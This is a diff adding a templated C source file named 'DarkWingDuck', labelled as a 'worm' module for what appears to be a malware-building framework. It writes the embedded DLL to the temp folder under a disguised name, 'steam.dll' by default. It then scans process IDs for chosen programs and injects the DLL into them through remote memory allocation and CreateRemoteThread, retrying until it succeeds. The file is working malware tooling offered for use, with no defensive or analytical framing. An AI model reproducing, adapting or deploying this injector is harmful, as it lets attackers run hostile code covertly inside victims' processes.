@@ -1,0 +1,180 @@
+#!name##DarkWingDuck
+#!itemType##worm
+#!info##A DLL injector written in C. It accepts a single DLL-type module, converts it into a COFF object, and embeds it into the executable. 
+#!info## When launched, it extracts the DLL and scans running processes for specified names, then attempts to inject the DLL into them. If the target processes are not found, it pauses and repeatedly scans again until successful.
+#!lang##c
+#!itemTags##WIN##EXE
+#!wormCompiler##Basic-C
+#!typeAccept##dll
+#!Wprocess##CoffProc
+#!modCOFF##DWD_COFF_OBJ##dll
+#!reqMod##DuckTalesLib2
+#!inFile##DuckTalesC_CORE_H##duck_core.h
+#!inFile##DuckTalesC_CORE_C##duck_core.c
+#!inFile##DuckTalesC_BASIC_H##duck_basic.h
+#!inFile##DuckTalesC_BASIC_C##duck_basic.c
+#!Var##DWD_dll_name##steam.dll##Name of the DLL file under which it will be saved.##str
+#!Var##DWD_tar_proc##notepad.exe,calc.exe##Names of the processes into which the DLL will be injected.. Separate names with commas ","##str
+#!Var##DWD_pid_start##1##The PID number from which the process search will begin.##str
+#!Var##DWD_pid_stop##20000##The PID number of the process at which the search will end.##str
+#!Var##DWD_pause##20##The interval (in seconds) between re-searching for processes.##str
+
+{% set DWD_TARGET_PROC = cTOOL.buildTableChar(DWD_tar_proc, ",") %}
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include "duck_basic.h"
+
+#define BASE_TEMP_SIZE 256
+#define TARGET_PID_START {{DWD_pid_start}}
+#define TARGET_PID_STOP {{DWD_pid_stop}}
+#define TARGET_PROCESS_NAME_BUFF 128
+#define TARGET_DLL_BUFF_SIZE 512
+#define TIME_PAUSE_SCAN {{DWD_pause}}
+
+const char *TARGET_PROCESS_NAME[] = {
+    {{DWD_TARGET_PROC}},
+     NULL};
+char dwd_TARGET_PATH[TARGET_DLL_BUFF_SIZE];
+char dwd_DLL_NAME[] = "{{DWD_dll_name}}";
+char TARGET_PROCESS_CHECK_NAME[TARGET_PROCESS_NAME_BUFF];
+
+
+extern const unsigned char _binary_{{DWD_COFF_OBJ}}_start[];
+extern const unsigned char _binary_{{DWD_COFF_OBJ}}_end[];
+
+typedef void (__stdcall *aSleep)(dt_DWORD);
+void *dwd_addr_Sleep;
+aSleep dwd_raw_Sleep;
+
+
+dt_DWORD dwd_TARGET_PID_START = TARGET_PID_START;
+dt_DWORD dwd_TARGET_PID_STOP = TARGET_PID_STOP;
+dt_DWORD dwd_TARGET_PID_ACTUAL = TARGET_PID_START;
+
+
+
+int dwdCheckName(char check_text[], const char *text_list[]) {
+    int t_index = 0;
+    while (1) {
+        if (text_list[t_index] == NULL) {
+            return 0;
+        }
+        if (strcmp(check_text, text_list[t_index]) == 0) {
+            return 1;
+        }
+        t_index++;
+    }
+    return 0;
+}
+
+dt_HANDLE dwdOpenProcRead(dt_DWORD pid) {
+    return dtf_OpenProcess(dtv_PROCESS_QUERY_INFORMATION | dtv_PROCESS_VM_READ, 0, pid);
+}
+
+int dwdCheckProcName(dt_HANDLE proc) {
+    dtfb_GetModuleBaseNameA(proc, 0, TARGET_PROCESS_CHECK_NAME, TARGET_PROCESS_NAME_BUFF);
+    int result = dwdCheckName(TARGET_PROCESS_CHECK_NAME, TARGET_PROCESS_NAME);
+    dtf_CloseHandle(proc);
+    return result;
+}
+
+dt_HANDLE dwdOpenProcFull(dt_DWORD pid) {
+    return dtf_OpenProcess(dtv_PROCESS_ALL_ACCESS, 0, pid);
+}
+
+int dwdHuntProcess(dt_DWORD start_pid) {
+    dt_HANDLE tar_proc;
+    for (dt_DWORD i=start_pid;i<=dwd_TARGET_PID_STOP;i++) {
+        tar_proc = dwdOpenProcRead(i);
+        if (tar_proc == 0) {
+            continue;
+        }
+        if (dwdCheckProcName(tar_proc) == 0) {
+            continue;
+        }
+        dwd_TARGET_PID_ACTUAL = i;
+        return 1;
+    }
+    return 0;
+}
+
+int dwdInject(dt_HANDLE proc) {
+    dt_DWORD mem_len = TARGET_DLL_BUFF_SIZE + 1;
+    dt_LPVOID mem_addr = dtf_VirtualAllocEx(proc, 0, mem_len, dtv_MEM_COMMIT_RESERVE, dtv_PAGE_EXECUTE_READWRITE);
+    if (mem_addr == 0) {
+        return 0;
+    }
+    dt_BOOL write_result = dtf_WriteProcessMemory(proc, mem_addr, dwd_TARGET_PATH, mem_len, 0);
+    if (write_result == 0) {
+        return 0;
+    }
+    dta_LoadLibraryA duckLLA = dtfra_LoadLibraryA();
+    dt_HANDLE tarTH = dtf_CreateRemoteThread(proc, 0, 0, duckLLA, mem_addr, 0, 0);
+    if (tarTH == 0) {
+        return 0;
+    }
+    return 1;
+}
+
+void dwdSleep(dt_DWORD pause) {
+    dwd_addr_Sleep = dt_DuckGetRawAddr("Sleep");
+    dwd_raw_Sleep = (aSleep)dwd_addr_Sleep;
+    dwd_raw_Sleep(pause);
+}
+
+int dwdHunting(void) {
+    int rhunt;
+    dt_HANDLE tar_proc;
+    while (1) {
+        rhunt = dwdHuntProcess(dwd_TARGET_PID_ACTUAL);
+        if (rhunt == 0) {
+            dwdSleep(TIME_PAUSE_SCAN * 1000);
+            dwd_TARGET_PID_ACTUAL = dwd_TARGET_PID_START;
+            continue;
+        }
+        tar_proc = dwdOpenProcFull(dwd_TARGET_PID_ACTUAL);
+        if (tar_proc == 0) {
+            dwd_TARGET_PID_ACTUAL++;
+            continue;
+        }
+        if (dwdInject(tar_proc) == 0) {
+            dwd_TARGET_PID_ACTUAL++;
+            continue;
+        }
+        break;
+    }
+}
+
+int dwdUnload(size_t dll_size) {
+    const unsigned char *target_dll = _binary_{{DWD_COFF_OBJ}}_start;
+    char btemp[BASE_TEMP_SIZE];
+    dt_DWORD result = dtfb_GetTempPathA(BASE_TEMP_SIZE, btemp);
+    if (result == 0) {
+        dt_DWORD result = dtfb_GetCurrentDirectoryA(BASE_TEMP_SIZE, btemp);
+        if (result == 0) {
+            return 0;
+        }
+    }
+    dtfb_PathCombineA(dwd_TARGET_PATH, btemp, dwd_DLL_NAME);
+    FILE *f = fopen(dwd_TARGET_PATH, "wb");
+    fwrite(target_dll, 1, dll_size, f);
+    fclose(f);
+
+    return 1;
+}
+
+
+
+int main(void) {
+    dt_DuckBasicInit();
+    dt_BasicFuncInit();
+    size_t dwd_DLL_LEN = _binary_{{DWD_COFF_OBJ}}_end - _binary_{{DWD_COFF_OBJ}}_start;
+    int result = dwdUnload(dwd_DLL_LEN);
+    if (result == 0) {
+        return 0;
+    }
+    dwdHunting();
+    return 0;
+}
